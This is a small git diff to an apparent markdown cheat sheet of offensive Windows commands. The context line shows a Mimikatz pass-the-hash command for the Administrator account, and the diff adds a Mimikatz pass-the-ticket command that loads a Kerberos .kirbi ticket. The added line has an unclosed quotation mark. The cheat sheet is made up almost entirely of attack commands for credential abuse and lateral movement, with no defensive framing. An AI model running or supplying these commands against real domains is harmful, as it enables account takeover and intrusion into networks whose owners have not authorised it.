@@ -19,6 +19,7 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:some.domain
 ## Mimikatz pass the tickets
 
 ```
+Invoke-Mimikatz -Command '"kerberos::ptt haisdfhaoigehrsfoirqaejfoijio(ticket).kirbi
 ```
 
 ![image](https://github.com/Luminous-split/LifeLongCommands/assets/116489011/e7174e46-0541-4686-bbf7-17e71e3bc679)
